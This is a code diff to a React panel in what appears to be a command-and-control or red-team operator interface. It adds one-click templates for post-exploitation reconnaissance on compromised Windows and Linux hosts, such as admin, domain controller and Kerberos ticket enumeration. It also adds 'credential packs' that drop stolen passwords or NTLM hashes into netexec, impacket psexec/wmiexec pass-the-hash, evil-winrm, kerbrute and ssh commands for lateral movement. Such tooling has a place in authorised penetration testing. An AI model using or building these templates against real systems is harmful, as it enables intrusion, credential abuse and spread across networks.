@@ -4,6 +4,80 @@ import Icon from './Icon.jsx';
 
 const RESERVED_AUTOFILL_KEYS = new Set(['user', 'username', 'pass', 'password', 'secret', 'domain', 'realm', 'target', 'host']);
 
+function getOperationTemplates(host) {
+  const os = String(host?.os || '').toLowerCase();
+  const isWindows = os.includes('win');
+  const isLinux = os.includes('linux') || os.includes('ubuntu') || os.includes('debian') || os.includes('centos') || os.includes('redhat');
+  const hasDomain = Boolean((host?.domain || '').trim());
+  const common = [
+    { id: 'whoami', label: 'Whoami', commandline: isWindows ? 'shell whoami /all' : 'shell whoami && id' },
+    { id: 'hostname', label: 'Host identity', commandline: isWindows ? 'shell hostname && ver' : 'shell hostname && uname -a' },
+    { id: 'net', label: 'Network info', commandline: isWindows ? 'shell ipconfig /all && route print' : 'shell ip a && ip route' },
+    { id: 'users', label: 'Logged-on users', commandline: isWindows ? 'shell query user' : 'shell w && who' },
+    { id: 'processes', label: 'Processes', commandline: isWindows ? 'shell tasklist' : 'shell ps aux' },
+  ];
+  const windows = [
+    { id: 'admins', label: 'Local admins', commandline: 'shell net localgroup administrators' },
+    { id: 'shares', label: 'Shares', commandline: 'shell net share' },
+    { id: 'services', label: 'Services', commandline: 'shell sc query type= service state= all' },
+    { id: 'sessions', label: 'Net sessions', commandline: 'shell net session' },
+  ];
+  const domain = [
+    { id: 'domain-whoami', label: 'Domain identity', commandline: 'shell whoami /all && echo {{DOMAIN}}' },
+    { id: 'dc-discovery', label: 'DC discovery', commandline: 'shell nltest /dsgetdc:{{DOMAIN}}' },
+    { id: 'kerb-tickets', label: 'Kerberos tickets', commandline: 'shell klist' },
+  ];
+  const linux = [
+    { id: 'sudoers', label: 'Sudo rights', commandline: 'shell sudo -l' },
+    { id: 'mounts', label: 'Mounts', commandline: 'shell mount && cat /etc/fstab' },
+    { id: 'services-linux', label: 'Services', commandline: 'shell systemctl list-units --type=service --state=running' },
+  ];
+  return [
+    ...common,
+    ...(isWindows ? windows : []),
+    ...(isLinux ? linux : []),
+    ...(isWindows && hasDomain ? domain : []),
+  ];
+}
+
+function getCredentialOperationPacks(host, cred) {
+  if (!cred) return [];
+  const os = String(host?.os || '').toLowerCase();
+  const isWindows = os.includes('win');
+  const isLinux = os.includes('linux') || os.includes('ubuntu') || os.includes('debian') || os.includes('centos') || os.includes('redhat');
+  const hasDomain = Boolean((host?.domain || '').trim() || (cred?.domain || '').trim());
+  const type = String(cred.type || '').toLowerCase();
+  const isHash = type.includes('hash') || type.includes('ntlm');
+
+  const packs = [];
+  if (isWindows) {
+    if (isHash) {
+      packs.push({ id: 'smb-hash', label: 'SMB hash check', commandline: 'netexec smb {{TARGET}} -u {{USER}} -H {{HASH}}' });
+      packs.push({ id: 'wmiexec-hash', label: 'WMI exec (hash)', commandline: 'impacket-wmiexec {{DOMAIN}}/{{USER}}@{{TARGET}} -hashes :{{HASH}}' });
+      packs.push({ id: 'psexec-hash', label: 'PsExec (hash)', commandline: 'impacket-psexec {{DOMAIN}}/{{USER}}@{{TARGET}} -hashes :{{HASH}}' });
+    } else {
+      packs.push({ id: 'smb-pass', label: 'SMB auth check', commandline: 'netexec smb {{TARGET}} -u {{USER}} -p {{PASS}}' });
+      packs.push({ id: 'winrm-pass', label: 'WinRM check', commandline: 'netexec winrm {{TARGET}} -u {{USER}} -p {{PASS}}' });
+      packs.push({ id: 'wmiexec-pass', label: 'WMI exec', commandline: 'impacket-wmiexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}}' });
+      packs.push({ id: 'psexec-pass', label: 'PsExec', commandline: 'impacket-psexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}}' });
+      packs.push({ id: 'evil-winrm', label: 'Evil-WinRM', commandline: 'evil-winrm -i {{TARGET}} -u {{USER}} -p {{PASS}}' });
+    }
+    if (hasDomain) {
+      packs.push({ id: 'ldap-bind', label: 'LDAP bind', commandline: 'ldapsearch -x -H ldap://{{TARGET}} -D "{{USER}}@{{DOMAIN}}" -w "{{PASS}}" -b "" "(objectClass=*)"' });
+      packs.push({ id: 'kerb-check', label: 'Kerberos check', commandline: 'kerbrute userenum -d {{DOMAIN}} --dc {{TARGET}} users.txt' });
+    }
+  }
+  if (isLinux && !isHash) {
+    packs.push({ id: 'ssh-check', label: 'SSH check', commandline: 'ssh -o StrictHostKeyChecking=no {{USER}}@{{TARGET}}' });
+    packs.push({ id: 'ssh-batch', label: 'SSH whoami', commandline: 'ssh -o StrictHostKeyChecking=no {{USER}}@{{TARGET}} "whoami && id && hostname"' });
+  }
+  if (!isWindows && !isLinux) {
+    if (isHash) packs.push({ id: 'hash-check', label: 'Hash auth check', commandline: 'netexec smb {{TARGET}} -u {{USER}} -H {{HASH}}' });
+    else packs.push({ id: 'auth-check', label: 'Auth check', commandline: 'netexec smb {{TARGET}} -u {{USER}} -p {{PASS}}' });
+  }
+  return packs;
+}
+
 function renderCommandTemplate(template, values) {
   let next = template || '';
   for (const [key, value] of Object.entries(values || {})) {
@@ -51,6 +125,9 @@ export default function C2HostActionsPanel({ pid, host, accent = '#5b8af5', onEx
   const sessions = data?.sessions || [];
   const creds = data?.creds || [];
   const sessionOptions = sessions.filter(s => s.integration_type === 'adaptix');
+  const operationTemplates = useMemo(() => getOperationTemplates(host), [host]);
+  const selectedCredential = useMemo(() => creds.find(c => c.id === form.credentialId && c.source === form.credentialSource) || null, [creds, form.credentialId, form.credentialSource]);
+  const credentialPacks = useMemo(() => getCredentialOperationPacks(host, selectedCredential), [host, selectedCredential]);
   const commandCatalog = useMemo(() => (data?.bofs || {})[form.integrationId] || [], [data?.bofs, form.integrationId]);
   const selectedCommand = useMemo(() => commandCatalog.find(item => item.id === form.commandId) || null, [commandCatalog, form.commandId]);
   const visibleParams = useMemo(() => (selectedCommand?.parameters || []).filter(param => !RESERVED_AUTOFILL_KEYS.has(String(param.key || '').toLowerCase())), [selectedCommand]);
@@ -108,6 +185,11 @@ export default function C2HostActionsPanel({ pid, host, accent = '#5b8af5', onEx
     setForm(prev => ({ ...prev, params: { ...(prev.params || {}), [key]: value } }));
   };
 
+  const applyTemplate = (template) => {
+    setForm(prev => ({ ...prev, mode: 'command', commandline: template.commandline }));
+    setCliInput(template.commandline);
+  };
+
   const run = async ({ interactive = false } = {}) => {
     const commandline = interactive
       ? cliInput.trim()
@@ -159,6 +241,19 @@ export default function C2HostActionsPanel({ pid, host, accent = '#5b8af5', onEx
             <button onClick={() => setForm(prev => ({ ...prev, mode: 'bof' }))} style={{ flex: 1, background: form.mode === 'bof' ? '#cc223322' : '#0e1016', border: `1px solid ${form.mode === 'bof' ? '#cc223377' : '#2a2d35'}`, borderRadius: 4, padding: '5px 8px', cursor: 'pointer', color: form.mode === 'bof' ? '#cc2233' : '#606570', fontSize: 9, fontFamily: 'JetBrains Mono' }}>BOF</button>
           </div>
 
+          {form.mode === 'command' && operationTemplates.length > 0 && (
+            <div style={{ marginBottom: 8 }}>
+              <div style={{ fontSize: 8, color: '#404550', marginBottom: 5, textTransform: 'uppercase', letterSpacing: '0.1em' }}>Quick operations</div>
+              <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
+                {operationTemplates.map(template => (
+                  <button key={template.id} onClick={() => applyTemplate(template)} style={{ background: form.commandline === template.commandline ? `${accent}22` : '#0e1016', border: `1px solid ${form.commandline === template.commandline ? accent + '66' : '#2a2d35'}`, borderRadius: 999, padding: '3px 8px', cursor: 'pointer', color: form.commandline === template.commandline ? accent : '#808590', fontSize: 9, fontFamily: 'JetBrains Mono' }}>
+                    {template.label}
+                  </button>
+                ))}
+              </div>
+            </div>
+          )}
+
           {form.mode === 'bof' && commandCatalog.length > 0 && (
             <>
               <select value={form.commandId} onChange={e => setForm(prev => ({ ...prev, commandId: e.target.value, params: {} }))} style={{ width: '100%', background: '#0e1016', border: '1px solid #2a2d35', borderRadius: 4, padding: '6px 8px', color: '#9098a8', fontSize: 10, fontFamily: 'JetBrains Mono', marginBottom: 8 }}>
@@ -196,10 +291,23 @@ export default function C2HostActionsPanel({ pid, host, accent = '#5b8af5', onEx
             {creds.map(c => <option key={`${c.source}:${c.id}`} value={`${c.source}:${c.id}`}>{c.source} :: {c.username}{c.domain ? `@${c.domain}` : ''}</option>)}
           </select>
 
+          {form.mode === 'command' && selectedCredential && credentialPacks.length > 0 && (
+            <div style={{ marginBottom: 8 }}>
+              <div style={{ fontSize: 8, color: '#404550', marginBottom: 5, textTransform: 'uppercase', letterSpacing: '0.1em' }}>Credential packs</div>
+              <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
+                {credentialPacks.map(template => (
+                  <button key={template.id} onClick={() => applyTemplate(template)} style={{ background: form.commandline === template.commandline ? '#cc223322' : '#0e1016', border: `1px solid ${form.commandline === template.commandline ? '#cc223366' : '#2a2d35'}`, borderRadius: 999, padding: '3px 8px', cursor: 'pointer', color: form.commandline === template.commandline ? '#cc2233' : '#808590', fontSize: 9, fontFamily: 'JetBrains Mono' }}>
+                    {template.label}
+                  </button>
+                ))}
+              </div>
+            </div>
+          )}
+
           {form.mode === 'command' && <textarea value={form.commandline} onChange={e => setForm(prev => ({ ...prev, commandline: e.target.value }))} placeholder="Command, e.g. shell whoami /all" rows={3} style={{ width: '100%', background: '#0e1016', border: '1px solid #2a2d35', borderRadius: 4, padding: '6px 8px', color: '#c8cdd6', fontSize: 10, outline: 'none', fontFamily: 'JetBrains Mono', resize: 'vertical', boxSizing: 'border-box', marginBottom: 8 }} />}
 
           <div style={{ fontSize: 9, color: '#404550', marginBottom: 8, fontFamily: 'JetBrains Mono' }}>
-            Supported autofill placeholders: <code>{'{{USER}}'}</code>, <code>{'{{PASS}}'}</code>, <code>{'{{DOMAIN}}'}</code>, <code>{'{{TARGET}}'}</code>
+            Supported autofill placeholders: <code>{'{{USER}}'}</code>, <code>{'{{PASS}}'}</code>, <code>{'{{DOMAIN}}'}</code>, <code>{'{{TARGET}}'}</code>, <code>{'{{HASH}}'}</code>
           </div>
 
           <button onClick={() => run()} disabled={running || !(form.mode === 'bof' ? renderedBofCommand.trim() : form.commandline.trim())} style={{ background: running ? '#1a1c22' : accent, border: 'none', borderRadius: 4, padding: '6px 10px', cursor: 'pointer', color: '#fff', fontSize: 10, fontWeight: 600, fontFamily: 'JetBrains Mono', display: 'flex', alignItems: 'center', gap: 6, marginBottom: 10 }}>
